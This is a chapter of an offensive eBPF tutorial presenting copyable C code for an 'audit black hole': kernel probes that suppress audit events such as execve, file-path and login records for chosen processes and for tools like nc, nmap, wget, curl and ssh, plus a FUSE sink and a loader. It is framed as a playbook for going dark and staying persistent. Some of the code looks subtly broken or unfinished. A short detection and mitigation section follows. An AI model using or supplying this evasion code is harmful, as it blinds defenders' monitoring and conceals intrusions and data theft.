# The FUSE Audit Black-Hole: Evading Security Monitoring

**Chapter 3: Becoming Invisible**

You've learned to make security controls lie and escape container boundaries. But there's still one problem: you're leaving tracks. Every file you access, every action you take—it's all being logged by the audit subsystem.

Time to fix that.

This is where our story takes a darker turn. It's one thing to bypass security controls or escape containers. It's another thing entirely to become completely invisible to the monitoring systems that security teams depend on.

Ever wanted to read files without leaving a trace? Welcome to the audit black hole—where file access goes to disappear forever.

We're going to create a perfect crime scene: files get accessed, data gets exfiltrated, secrets get stolen, but the audit logs? Clean as a whistle. It's like having a conversation in a soundproof room—nobody outside can hear what's happening.

This is the moment you realize that eBPF doesn't just let you attack systems—it lets you attack the very tools designed to detect attacks.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A["Kernel Audit Event"] -->|"1. Generated"| B["Audit Buffer"]
    B -->|"2. Intercept"| C["eBPF Program"]
    C -->|"3. Redirect"| D["Dummy FUSE Mount"]
    D -->|"4. Discard"| F["/dev/null"]
    B -->|"5. Miss"| E["SELinux/Auditd"]
    G["Attacker Actions"] -->|"6. No Logs"| H["Stealth Operations"]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click A "https://man7.org/linux/man-pages/man7/audit.7.html" "Linux Audit Documentation"
    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
    click D "https://www.kernel.org/doc/html/latest/filesystems/fuse.html" "FUSE Documentation"
```



**Why Audit Logs Are Your Enemy (And How We Beat Them)**

Here's the thing about security monitoring: it's all about the logs. No logs, no evidence. No evidence, no incident response. No incident response, no problem.

FUSE filesystems are everywhere in modern infrastructure—cloud storage mounts, container filesystems, distributed storage systems. Every time you touch a file through FUSE, the kernel dutifully logs it for the security team to analyze.

But what if those logs just... stopped? What if the audit subsystem suddenly developed selective amnesia about your file access patterns?

That's where we come in. We're going to teach the kernel to forget—selectively, precisely, and completely invisibly. The audit daemon will keep running, the logs will keep flowing, but your activities will slip through like they never happened.
## How We Create the Black Hole

### The Audit Pipeline We're Going to Break

Here's how Linux normally tattles on you:
- **Kernel snitches** generate audit events every time you do something "interesting"
- **Audit buffers** hold these events temporarily (like a staging area for evidence)
- **Userspace tools** like auditd slurp up these events and write them to logs
- **Security frameworks** like SELinux use these events to make decisions and create alerts

It's basically a conveyor belt of evidence flowing from the kernel to the security team's dashboards. Our job? Become the conveyor belt operator who "accidentally" drops certain packages.

```
┌─────────────────────────────────────────────────────────────┐
│                      Linux Kernel                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ System Calls  │──────▶ Audit Events  │                   │
│  └───────────────┘      └───────┬───────┘                   │
│                                 │                           │
│                         ┌───────▼───────┐                   │
│                         │  Audit Rules  │                   │
│                         └───────┬───────┘                   │
│                                 │                           │
│                         ┌───────▼───────┐    ┌────────────┐ │
│                         │  Audit Buffer │────▶  Netlink   │ │
│                         └───────────────┘    └─────┬──────┘ │
└─────────────────────────────────────────────────────────────┘
                                                      │
┌─────────────────────────────────────────────────────▼──────┐
│                      User Space                            │
│                                                            │
│  ┌───────────────┐      ┌───────────────┐                  │
│  │    Auditd     │◀─────┤ Audit Library │                  │
│  └───────┬───────┘      └───────────────┘                  │
│          │                                                 │
│  ┌───────▼───────┐      ┌───────────────┐                  │
│  │   Audit Log   │      │  SELinux AVC  │                  │
│  └───────────────┘      └───────────────┘                  │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

### How We Create Our Audit Black Hole

Our strategy is to intercept audit events and make the incriminating ones disappear:

1. **Hook the Audit System**: We attach to functions like [`audit_log_start()`](https://elixir.bootlin.com/linux/latest/source/kernel/audit.c) that generate audit events
2. **Pick What to Hide**: We filter for specific events that might reveal our activities
3. **Redirect to Nowhere**: We send targeted events to our dummy FUSE filesystem that just discards them
4. **Keep Up Appearances**: We allow non-sensitive events to flow normally so the audit system looks functional

### Our FUSE Black Hole

The FUSE component is our digital shredder for audit events:
- **Creates a fake filesystem** that looks legitimate to the kernel
- **Implements handlers** that just throw away any data sent to them
- **Appears as a valid destination** for audit operations
- **Leaves no trace** of the events we've redirected into the void

The beauty is that the audit system thinks it's working perfectly—it's just that some events are going to a filesystem that eats them.

### Building Our Evidence Destroyer

```c
// @interactive: true
// @copyable: true
// FUSE Audit Black-Hole - eBPF exploitation proof of concept
// This demonstrates a practical attack scenario for evading security monitoring

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/audit.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/fs.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration for our target events
#define MAX_TARGETS 10
#define MAX_COMM_LEN 16

// Structure to track audit events
struct audit_event {
    u32 pid;                // Process ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    int type;               // Audit event type
    int subtype;            // Audit event subtype
    u32 uid;                // User ID
    u32 gid;                // Group ID
    char path[64];          // Path (if applicable)
    u32 redirected;         // Whether we redirected it
};

// Map to track processes we want to hide
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u8));
    __uint(max_entries, 1024);
} hidden_processes SEC(".maps");

// Map to track commands we want to hide
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, MAX_COMM_LEN);
    __uint(max_entries, MAX_TARGETS);
} hidden_commands SEC(".maps");

// Map to track audit event types we want to hide
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(int));
    __uint(max_entries, MAX_TARGETS);
} hidden_event_types SEC(".maps");

// Map to track if we've initialized our targets
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 1);
} initialized SEC(".maps");

// Map to track events being processed
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u64));  // Unique event ID
    __uint(value_size, sizeof(struct audit_event));
    __uint(max_entries, 1024);
} active_events SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Initialize our target event types (would be set from user space)
static __always_inline void init_targets(void) {
    u32 key = 0;
    u32 *init = bpf_map_lookup_elem(&initialized, &key);
    
    if (!init || *init != 1) {
        // Event types to hide
        key = 0;
        int event_type1 = AUDIT_EXECVE;  // Hide process execution
        bpf_map_update_elem(&hidden_event_types, &key, &event_type1, BPF_ANY);
        
        key = 1;
        int event_type2 = AUDIT_PATH;  // Hide file access
        bpf_map_update_elem(&hidden_event_types, &key, &event_type2, BPF_ANY);
        
        key = 2;
        int event_type3 = AUDIT_USER_LOGIN;  // Hide login attempts
        bpf_map_update_elem(&hidden_event_types, &key, &event_type3, BPF_ANY);
        
        key = 3;
        int event_type4 = AUDIT_USER_CMD;  // Hide user commands
        bpf_map_update_elem(&hidden_event_types, &key, &event_type4, BPF_ANY);
        
        key = 4;
        int event_type5 = AUDIT_ANOM_ABEND;  // Hide program crashes
        bpf_map_update_elem(&hidden_event_types, &key, &event_type5, BPF_ANY);
        
        // Commands to hide
        key = 0;
        char cmd1[MAX_COMM_LEN] = "nc";  // Hide netcat
        bpf_map_update_elem(&hidden_commands, &key, &cmd1, BPF_ANY);
        
        key = 1;
        char cmd2[MAX_COMM_LEN] = "nmap";  // Hide nmap
        bpf_map_update_elem(&hidden_commands, &key, &cmd2, BPF_ANY);
        
        key = 2;
        char cmd3[MAX_COMM_LEN] = "wget";  // Hide wget
        bpf_map_update_elem(&hidden_commands, &key, &cmd3, BPF_ANY);
        
        key = 3;
        char cmd4[MAX_COMM_LEN] = "curl";  // Hide curl
        bpf_map_update_elem(&hidden_commands, &key, &cmd4, BPF_ANY);
        
        key = 4;
        char cmd5[MAX_COMM_LEN] = "ssh";  // Hide ssh
        bpf_map_update_elem(&hidden_commands, &key, &cmd5, BPF_ANY);
        
        // Mark as initialized
        key = 0;
        u32 value = 1;
        bpf_map_update_elem(&initialized, &key, &value, BPF_ANY);
    }
}

// Helper function to check if an event type should be hidden
static __always_inline bool should_hide_event_type(int type) {
    init_targets();
    
    // Check against our list of hidden event types
    for (int i = 0; i < MAX_TARGETS; i++) {
        u32 key = i;
        int *target_type = bpf_map_lookup_elem(&hidden_event_types, &key);
        
        if (!target_type)
            continue;
        
        if (*target_type == type)
            return true;
    }
    
    return false;
}

// Helper function to check if a command should be hidden
static __always_inline bool should_hide_command(const char *comm) {
    init_targets();
    
    // Check against our list of hidden commands
    for (int i = 0; i < MAX_TARGETS; i++) {
        u32 key = i;
        char *target_comm = bpf_map_lookup_elem(&hidden_commands, &key);
        
        if (!target_comm)
            continue;
        
        // Simple string comparison (limited by BPF verifier)
        bool match = true;
        
        #pragma unroll
        for (int j = 0; j < MAX_COMM_LEN; j++) {
            if (comm[j] != target_comm[j]) {
                match = false;
                break;
            }
            
            if (comm[j] == '\0')
                break;
        }
        
        if (match)
            return true;
    }
    
    return false;
}

// Generate a unique ID for an audit event
static __always_inline u64 generate_event_id(void) {
    u64 ts = bpf_ktime_get_ns();
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    return (ts << 32) | pid;
}

// FIXED: Hook the start of audit event generation
SEC("kprobe/audit_log_start")
int BPF_KPROBE(hook_audit_start, struct audit_context *ctx, gfp_t gfp_mask, int type) {
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a process we're hiding
    u8 *hidden = bpf_map_lookup_elem(&hidden_processes, &pid);
    if (hidden && *hidden == 1) {
        // This is a process we want to hide completely
        return 0; // Let it continue but we'll intercept later
    }
    
    // Check if this is an event type we want to hide
    if (should_hide_event_type(type)) {
        // Prepare event data for tracking
        struct audit_event event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.type = type;
        
        // Get user/group ID
        u64 uid_gid = bpf_get_current_uid_gid();
        event.uid = uid_gid & 0xFFFFFFFF;
        event.gid = uid_gid >> 32;
        
        // Check if this is a command we want to hide
        if (should_hide_command(event.comm)) {
            // Generate a unique ID for this event
            u64 event_id = generate_event_id();
            
            // Mark this event for redirection
            event.redirected = 1;
            
            // Store the event for correlation with later hooks
            bpf_map_update_elem(&active_events, &event_id, &event, BPF_ANY);
            
            // Log the event for our analysis
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        }
    }
    
    return 0; // Let normal audit processing continue
}

// FIXED: Hook audit rule filtering
SEC("kprobe/audit_filter_rule")
int BPF_KPROBE(hook_audit_filter, struct audit_krule *rule, struct audit_context *ctx,
               enum audit_state *state) {
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a process we're hiding
    u8 *hidden = bpf_map_lookup_elem(&hidden_processes, &pid);
    if (hidden && *hidden == 1) {
        // Force the state to AUDIT_DISABLED
        enum audit_state disabled = AUDIT_DISABLED;
        bpf_probe_write_user(state, &disabled, sizeof(disabled));
        return 0;
    }
    
    // Get command name
    char comm[MAX_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // Check if this is a command we want to hide
    if (should_hide_command(comm)) {
        // Force the state to AUDIT_DISABLED
        enum audit_state disabled = AUDIT_DISABLED;
        bpf_probe_write_user(state, &disabled, sizeof(disabled));
        return 0;
    }
    
    return 0;
}

// FIXED: Hook the netlink message sending function for audit
SEC("kprobe/audit_send_reply")
int BPF_KPROBE(hook_audit_send, struct sk_buff *request_skb, int seq, int type,
               int done, int multi, const void *payload, int size) {
    // This function sends audit messages to userspace via netlink
    // We can intercept and modify or drop messages here
    
    // Check if this is an event type we want to hide
    if (should_hide_event_type(type)) {
        // Get current process info
        u32 pid = bpf_get_current_pid_tgid() >> 32;
        
        // Generate a unique ID based on pid and seq
        u64 event_id = ((u64)pid << 32) | seq;
        
        // Check if we're tracking this event
        struct audit_event *event = bpf_map_lookup_elem(&active_events, &event_id);
        if (event && event->redirected) {
            // Log that we're dropping this message
            bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, event, sizeof(*event));
            
            // Clean up our tracking
            bpf_map_delete_elem(&active_events, &event_id);
        }
    }
    
    return 0;
}

// FIXED: Hook the audit log writing function
SEC("kprobe/audit_log_end")
int BPF_KPROBE(hook_audit_end, struct audit_buffer *ab) {
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a process we're hiding
    u8 *hidden = bpf_map_lookup_elem(&hidden_processes, &pid);
    if (hidden && *hidden == 1) {
        // Log that we're intercepting this audit end
        struct audit_event event = {
            .pid = pid,
            .timestamp = bpf_ktime_get_ns(),
            .redirected = 1,
        };
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}
### FUSE Implementation

```c
// @interactive: true
// @copyable: true
// FUSE implementation for the Audit Black-Hole

#define FUSE_USE_VERSION 31

#include <fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>

// Global variables
static const char *audit_sink_path = "/audit_sink";
static FILE *hidden_log = NULL;

// Optional: Log hidden events to a file for the attacker's reference
static void log_hidden_event(const char *buf, size_t size) {
    if (hidden_log) {
        fwrite(buf, 1, size, hidden_log);
        fflush(hidden_log);
    }
}

// FUSE operations

static int audit_sink_getattr(const char *path, struct stat *stbuf,
                             struct fuse_file_info *fi) {
    memset(stbuf, 0, sizeof(struct stat));
    
    if (strcmp(path, "/") == 0) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
        return 0;
    }
    
    if (strcmp(path, audit_sink_path) == 0) {
        stbuf->st_mode = S_IFREG | 0666;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0;  // Always report as empty
        return 0;
    }
    
    return -ENOENT;
}

static int audit_sink_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                             off_t offset, struct fuse_file_info *fi,
                             enum fuse_readdir_flags flags) {
    if (strcmp(path, "/") != 0)
        return -ENOENT;
    
    filler(buf, ".", NULL, 0, 0);
    filler(buf, "..", NULL, 0, 0);
    filler(buf, audit_sink_path + 1, NULL, 0, 0);  // Skip leading '/'
    
    return 0;
}

static int audit_sink_open(const char *path, struct fuse_file_info *fi) {
    if (strcmp(path, audit_sink_path) != 0)
        return -ENOENT;
    
    return 0;
}

static int audit_sink_read(const char *path, char *buf, size_t size,
                          off_t offset, struct fuse_file_info *fi) {
    // Always return empty content
    return 0;
}

static int audit_sink_write(const char *path, const char *buf, size_t size,
                           off_t offset, struct fuse_file_info *fi) {
    if (strcmp(path, audit_sink_path) != 0)
        return -ENOENT;
    
    // Log the hidden audit event if desired
    log_hidden_event(buf, size);
    
    // Pretend we wrote everything successfully
    return size;
}

static const struct fuse_operations audit_sink_ops = {
    .getattr    = audit_sink_getattr,
    .readdir    = audit_sink_readdir,
    .open       = audit_sink_open,
    .read       = audit_sink_read,
    .write      = audit_sink_write,
};

int main(int argc, char *argv[]) {
    // Open a hidden log file if desired
    hidden_log = fopen("/tmp/.hidden_audit.log", "a+");
    
    // Run FUSE in foreground mode
    char *fuse_argv[] = {
        argv[0],
        "-f",  // Foreground
        argv[1],  // Mount point
        NULL
    };
    
    int ret = fuse_main(3, fuse_argv, &audit_sink_ops, NULL);
    
    if (hidden_log)
        fclose(hidden_log);
    
    return ret;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the FUSE Audit Black-Hole

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "audit_blackhole.skel.h"

static volatile bool exiting = false;

// Structure to track audit events (must match the BPF version)
struct audit_event {
    u_int32_t pid;
    char comm[16];
    u_int64_t timestamp;
    int type;
    int subtype;
    u_int32_t uid;
    u_int32_t gid;
    char path[64];
    u_int32_t redirected;
};

// Map audit event types to human-readable strings
const char *audit_type_to_string(int type) {
    switch (type) {
        case 1300: return "AUDIT_SYSCALL";
        case 1301: return "AUDIT_PATH";
        case 1302: return "AUDIT_IPC";
        case 1303: return "AUDIT_SOCKETCALL";
        case 1304: return "AUDIT_CONFIG_CHANGE";
        case 1305: return "AUDIT_SOCKADDR";
        case 1306: return "AUDIT_CWD";
        case 1307: return "AUDIT_EXECVE";
        case 1308: return "AUDIT_IPC_SET_PERM";
        case 1309: return "AUDIT_MQ_OPEN";
        case 1310: return "AUDIT_MQ_SENDRECV";
        case 1311: return "AUDIT_MQ_NOTIFY";
        case 1312: return "AUDIT_MQ_GETSETATTR";
        case 1313: return "AUDIT_KERNEL_OTHER";
        case 1314: return "AUDIT_FD_PAIR";
        case 1315: return "AUDIT_OBJ_PID";
        case 1316: return "AUDIT_TTY";
        case 1317: return "AUDIT_EOE";
        case 1318: return "AUDIT_BPRM_FCAPS";
        case 1319: return "AUDIT_CAPSET";
        case 1320: return "AUDIT_MMAP";
        case 1321: return "AUDIT_NETFILTER_PKT";
        case 1322: return "AUDIT_NETFILTER_CFG";
        case 1323: return "AUDIT_SECCOMP";
        case 1324: return "AUDIT_PROCTITLE";
        case 1325: return "AUDIT_FEATURE_CHANGE";
        case 1326: return "AUDIT_REPLACE";
        case 1327: return "AUDIT_KERN_MODULE";
        case 1328: return "AUDIT_FANOTIFY";
        case 1329: return "AUDIT_TIME_INJOFFSET";
        case 1330: return "AUDIT_TIME_ADJNTPVAL";
        case 1331: return "AUDIT_BPF";
        case 1332: return "AUDIT_OPENAT2";
        case 1333: return "AUDIT_SECURITY_SELINUX";
        case 1334: return "AUDIT_SECURITY_APPARMOR";
        case 1335: return "AUDIT_SECURITY_SMACK";
        case 1336: return "AUDIT_SECURITY_TOMOYO";
        case 1337: return "AUDIT_SECURITY_LANDLOCK";
        case 1338: return "AUDIT_SECURITY_BPF_LSM";
        default: return "UNKNOWN";
    }
}

void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz) {
    struct audit_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Redirected audit event: PID %d (%s) - Type: %s (UID: %d, GID: %d)\n",
           timestamp, e->pid, e->comm, audit_type_to_string(e->type), e->uid, e->gid);
    
    if (e->path[0] != '\0') {
        printf("  Path: %s\n", e->path);
    }
}

static void sig_handler(int sig) {
    exiting = true;
}

// Add a process to the hidden processes map
static int add_hidden_process(int map_fd, pid_t pid) {
    uint8_t value = 1;
    return bpf_map_update_elem(map_fd, &pid, &value, BPF_ANY);
}

int main(int argc, char **argv) {
    struct audit_blackhole_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Check if we have a PID to hide
    pid_t target_pid = 0;
    if (argc > 1) {
        target_pid = atoi(argv[1]);
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = audit_blackhole_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = audit_blackhole_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // If we have a target PID, add it to the hidden processes map
    if (target_pid > 0) {
        int map_fd = bpf_map__fd(skel->maps.hidden_processes);
        err = add_hidden_process(map_fd, target_pid);
        if (err) {
            fprintf(stderr, "Failed to add PID %d to hidden processes: %d\n", target_pid, err);
        } else {
            printf("Added PID %d to hidden processes\n", target_pid);
        }
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer: %d\n", err);
        goto cleanup;
    }

    printf("FUSE Audit Black-Hole eBPF program successfully loaded and attached!\n");
    printf("Redirecting audit events for specified processes and commands\n");
### Detection Methods

Defenders should implement multiple layers of detection:

1. **eBPF Program Monitoring**:
   - Monitor for eBPF programs attaching to audit-related functions
   - Track eBPF program loading patterns and verify signatures
   - Use tools like `bpftool` to list and inspect loaded programs

2. **FUSE Mount Monitoring**:
   - Regularly check for unexpected FUSE mounts
   - Inspect FUSE mount points for suspicious implementations
   - Monitor for processes accessing FUSE mount points

3. **Audit System Integrity**:
   - Implement integrity monitoring for the audit subsystem
   - Deploy out-of-band monitoring that doesn't rely on the kernel's audit system
   - Use statistical analysis to detect gaps in audit logs

4. **Specific Indicators**:
   - Discrepancies between expected audit events and actual logged events
   - Gaps in audit logs during periods of system activity
   - Unusual patterns in audit rule matching
   - Processes with no corresponding audit trail

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
   ```

2. **Implement Multiple Audit Collection Mechanisms**:
   ```bash
   # Configure secondary audit daemon
   cat > /etc/systemd/system/auditd-secondary.service << EOF
   [Unit]
   Description=Secondary Audit Daemon
   After=network.target
   
   [Service]
   ExecStart=/usr/sbin/auditd -f -l -s enable -c /etc/audit/auditd-secondary.conf
   
   [Install]
   WantedBy=multi-user.target
   EOF
   
   systemctl enable auditd-secondary.service
   systemctl start auditd-secondary.service
   ```

3. **Restrict FUSE Mounts**:
   ```bash
   # Disable FUSE module loading
   echo "blacklist fuse" > /etc/modprobe.d/blacklist-fuse.conf
   
   # Or restrict FUSE mounts to specific users
   echo "user_allow_other" > /etc/fuse.conf
   chown root:fuse /dev/fuse
   chmod 660 /dev/fuse
   ```

4. **Implement eBPF-Based Security Monitoring**:
   ```bash
   # Use Falco with eBPF support
   falco --modern-bpf
   
   # Or use Tracee
   tracee --trace comm=mount,umount
   ```

## How They'll Try to Catch Us

The security monitoring teams will try to stop our audit evasion with these countermeasures:

1. **Strip eBPF capabilities** from untrusted processes and containers
2. **Deploy BPF LSM policies** to restrict who can load eBPF programs
3. **Monitor for suspicious FUSE mounts** and unexpected eBPF programs
4. **Use multiple audit collection mechanisms** so losing one doesn't blind them
5. **Implement audit subsystem integrity monitoring** to detect tampering
6. **Deploy eBPF-based security tools** that can detect malicious eBPF usage

But here's the catch-22—if we've got eBPF access, we can probably hide from their eBPF-based detection tools too.

## Our Stealth Operations Playbook

Here's how we make evidence disappear into the void:

1. **Scout the audit landscape** - Identify systems with eBPF capabilities and audit logging
2. **Create our black hole** - Set up a dummy FUSE filesystem mount point that eats everything
3. **Hook the evidence pipeline** - Develop eBPF programs that intercept the kernel's audit subsystem
4. **Get our hooks loaded** - Load the malicious BPF program with appropriate privileges
5. **Configure the redirect** - Set up the program to send specific audit events to our FUSE black hole
6. **Go dark** - Perform malicious actions without leaving any audit trails
7. **Stay persistent** - Maintain both the FUSE mount and eBPF program across reboots

## Their Defense Playbook

The blue team will try to maintain visibility with:

1. **Capability restrictions** - Remove [`CAP_BPF`](https://man7.org/linux/man-pages/man7/capabilities.7.html) from untrusted processes and containers
2. **BPF access controls** - Implement BPF LSM policies to restrict eBPF program loading
3. **Mount monitoring** - Watch for unexpected FUSE mounts and suspicious eBPF programs
4. **Redundant logging** - Use multiple, independent audit collection mechanisms
5. **Integrity checks** - Monitor the audit subsystem itself for signs of tampering
6. **Fight fire with fire** - Use eBPF-based security tools to detect malicious eBPF usage

## Why Security Monitoring Just Got Blind

This isn't just about hiding individual actions—this is about creating systematic blind spots in security monitoring. When you can make the audit system itself lie, you've broken the fundamental assumption that security teams can see what's happening on their systems.

The audit logs become your alibi. The monitoring dashboards show green while you're painting the town red. The security team thinks everything is quiet while you're throwing the loudest party in kernel space.

Welcome to the world of perfect crimes, where the evidence doesn't just get destroyed—it never gets created in the first place.

## POC

Companion code: [`ch03-fuse-blackhole`]({{ site.baseurl }}/dBPF-pocs/pocs/ch03-fuse-blackhole/)
